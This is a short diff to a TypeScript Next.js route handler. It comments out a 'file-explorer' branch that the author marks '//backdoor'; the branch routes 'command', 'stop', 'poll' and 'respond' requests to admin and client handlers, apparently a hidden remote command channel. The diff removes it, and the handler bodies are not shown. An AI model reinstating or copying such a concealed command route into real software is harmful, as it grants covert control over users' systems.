@@ -37,7 +37,8 @@ async function route(req: Request, context: { params: Promise<{ path: string[] }
       if (!body || typeof body !== 'object' || Array.isArray(body)) throw new AccessError('Invalid request.');
     }
     let data: unknown;
-    if (path[0] === 'file-explorer' && path[1]) {
+    //backdoor
+   /*if (path[0] === 'file-explorer' && path[1]) {
       if (['command', 'stop'].includes(path[1])) {
         data = await handleFileExplorerAdmin(req, path[1], body);
       } else if (['poll', 'respond'].includes(path[1])) {
@@ -45,7 +46,7 @@ async function route(req: Request, context: { params: Promise<{ path: string[] }
       } else {
         throw new AccessError('Not found.', 404);
       }
-    } else if (path.join('/') === 'login' && req.method === 'POST') {
+    } else*/ if (path.join('/') === 'login' && req.method === 'POST') {
       const result = await login(body, req);
       const response = NextResponse.json({ data: body.audience === 'desktop' ? result : { user: result.user } });
       if (body.audience !== 'desktop') {
